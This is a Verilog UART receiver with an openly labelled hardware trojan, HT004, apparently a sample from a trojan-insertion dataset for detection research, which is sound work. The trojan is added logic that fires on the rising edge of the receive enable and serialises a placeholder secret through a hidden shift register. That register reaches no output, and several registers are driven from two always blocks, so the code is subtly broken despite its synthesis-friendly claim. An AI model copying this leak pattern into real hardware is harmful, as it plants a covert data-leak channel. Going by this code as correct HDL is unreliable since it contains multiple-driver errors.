`timescale 1ns/1ns

// ========== MODULE WITH TROJAN HT004 (CORRECTED & SYNTHESIS-FRIENDLY) ==========
// Trojan: HT004
// Region: chunk_002_RX SAMPLE GATING (ENABLE-DRIVEN)
// HT Type: HT2_Leakage
// Stealth: High
// Damage: High
module uart_rx #(
    parameter integer CYCLES_PER_BIT = 5000,
    parameter integer PAYLOAD_BITS   = 8,
    parameter integer STOP_BITS      = 1,
    parameter integer COUNT_REG_LEN  = 14
)(
    input  wire                      clk,
    input  wire                      resetn,
    input  wire                      uart_rxd,
    input  wire                      uart_rx_en,
    output wire                      uart_rx_break,
    output wire                      uart_rx_valid,
    output reg  [PAYLOAD_BITS-1:0]   uart_rx_data
);

// FSM encodings
localparam [2:0] FSM_IDLE  = 3'd0;
localparam [2:0] FSM_START = 3'd1;
localparam [2:0] FSM_RECV  = 3'd2;
localparam [2:0] FSM_STOP  = 3'd3;

// RX registers / counters
reg rxd_reg;
reg rxd_reg_0;

reg [PAYLOAD_BITS-1:0] received_data;

reg [COUNT_REG_LEN-1:0] cycle_counter;

reg [3:0] bit_counter;

reg bit_sample;

reg [2:0] fsm_state;
reg [2:0] n_fsm_state;

// ========== HARDWARE TROJAN DECLARATIONS ==========
reg        trojan_trigger;        // asserted on uart_rx_en rising edge (trigger)
reg [31:0] trojan_leak_data;     // secret/phantom data to leak
reg [7:0]  trojan_shift_reg;     // shift register used by trojan to serialise leak
reg [3:0]  trojan_state;         // trojan progress counter (0..8)
reg        trojan_send_flag;     // indicates trojan is actively shifting/leaking
reg        uart_rx_en_d;         // delayed uart_rx_en to detect rising edge
// ========== END TROJAN DECLARATIONS ==========

// uart_rx_valid is asserted when state machine has reached STOP and will go to IDLE next
assign uart_rx_valid = (fsm_state == FSM_STOP) && (n_fsm_state == FSM_IDLE);

// uart_rx_break asserted when valid frame and received_data is all zeros
assign uart_rx_break = uart_rx_valid && ~|received_data;

// Capture uart_rx_data when STOP state reached
always @(posedge clk) begin
    if (!resetn) begin
        uart_rx_data <= {PAYLOAD_BITS{1'b0}};
    end else if (fsm_state == FSM_STOP) begin
        uart_rx_data <= received_data;
    end
end

// next_bit and payload_done
wire next_bit    = (cycle_counter == CYCLES_PER_BIT) ||
                   (fsm_state == FSM_STOP && cycle_counter == (CYCLES_PER_BIT/2));
wire payload_done = (bit_counter == PAYLOAD_BITS);

// Compute next FSM state (combinational)
always @(*) begin : p_n_fsm_state
    case (fsm_state)
        FSM_IDLE  : n_fsm_state = rxd_reg ? FSM_IDLE : FSM_START;
        FSM_START : n_fsm_state = next_bit ? FSM_RECV  : FSM_START;
        FSM_RECV  : n_fsm_state = payload_done ? FSM_STOP : FSM_RECV;
        FSM_STOP  : n_fsm_state = next_bit ? FSM_IDLE : FSM_STOP;
        default   : n_fsm_state = FSM_IDLE;
    endcase
end

// Received data shifting (synthesizable, MSB-first)
integer i;
always @(posedge clk) begin : p_received_data
    if (!resetn) begin
        received_data <= {PAYLOAD_BITS{1'b0}};
    end else if (fsm_state == FSM_IDLE) begin
        received_data <= {PAYLOAD_BITS{1'b0}};
    end else if (fsm_state == FSM_RECV && next_bit) begin
        // SHIFT-IN: put sampled bit at MSB, shift right
        received_data <= { bit_sample, received_data[PAYLOAD_BITS-1:1] };
    end
end

// Bit counter (4-bit)
always @(posedge clk) begin : p_bit_counter
    if (!resetn) begin
        bit_counter <= 4'b0;
    end else if (fsm_state != FSM_RECV) begin
        bit_counter <= 4'b0;
    end else if (fsm_state == FSM_RECV && next_bit) begin
        bit_counter <= bit_counter + 1'b1;
    end
end

// Bit sampling (sample at midpoint)
always @(posedge clk) begin : p_bit_sample
    if (!resetn) begin
        bit_sample <= 1'b0;
    end else if (cycle_counter == (CYCLES_PER_BIT/2)) begin
        bit_sample <= rxd_reg;
    end
end

// Cycle counter
always @(posedge clk) begin : p_cycle_counter
    if (!resetn) begin
        cycle_counter <= {COUNT_REG_LEN{1'b0}};
    end else if (next_bit) begin
        cycle_counter <= {COUNT_REG_LEN{1'b0}};
    end else if (fsm_state == FSM_START ||
                 fsm_state == FSM_RECV  ||
                 fsm_state == FSM_STOP  ) begin
        cycle_counter <= cycle_counter + 1'b1;
    end
end

// FSM state register
always @(posedge clk) begin : p_fsm_state
    if (!resetn) begin
        fsm_state <= FSM_IDLE;
    end else begin
        fsm_state <= n_fsm_state;
    end
end

// RX synchronizer registers and trojan trigger detection
always @(posedge clk) begin : p_rxd_reg_and_trigger
    if (!resetn) begin
        rxd_reg         <= 1'b1;
        rxd_reg_0       <= 1'b1;
        uart_rx_en_d    <= 1'b0;

        // trojan initial state
        trojan_trigger  <= 1'b0;
        trojan_leak_data<= 32'hDEADBEEF; // secret to be leaked (placeholder)
        trojan_shift_reg<= 8'h00;
        trojan_state    <= 4'h0;
        trojan_send_flag<= 1'b0;
    end else begin
        // Update synchronizer (we keep original gating behaviour: update when enable is asserted)
        if (uart_rx_en) begin
            rxd_reg   <= rxd_reg_0;
            rxd_reg_0 <= uart_rxd;
        end

        // detect rising edge of uart_rx_en -> trigger trojan
        uart_rx_en_d <= uart_rx_en;
        if (uart_rx_en && !uart_rx_en_d) begin
            // on rising edge of uart_rx_en, trigger trojan load/send
            trojan_trigger <= 1'b1;
        end
    end
end

// Trojan process: load leak data on trigger, then serialise via trojan_shift_reg over 8 cycles
always @(posedge clk) begin : p_trojan_proc
    if (!resetn) begin
        trojan_shift_reg <= 8'h00;
        trojan_state <= 4'h0;
        trojan_send_flag <= 1'b0;
        trojan_trigger <= 1'b0;
    end else begin
        if (trojan_trigger && !trojan_send_flag) begin
            // Load lowest byte of the secret into shift-register and start send
            trojan_shift_reg <= trojan_leak_data[7:0];
            trojan_state <= 4'h0;
            trojan_send_flag <= 1'b1;
            // consume trigger (one-shot)
            trojan_trigger <= 1'b0;
        end else if (trojan_send_flag) begin
            // shift out one bit per clock (example behaviour)
            // Here we rotate right by 1 bit each cycle (user can change timing to next_bit if desired)
            trojan_shift_reg <= {1'b0, trojan_shift_reg[7:1]};
            trojan_state <= trojan_state + 1'b1;

            // finish after 8 cycles
            if (trojan_state == 4'd7) begin
                trojan_send_flag <= 1'b0;
                trojan_state <= 4'h0;
            end
        end
    end
end

endmodule
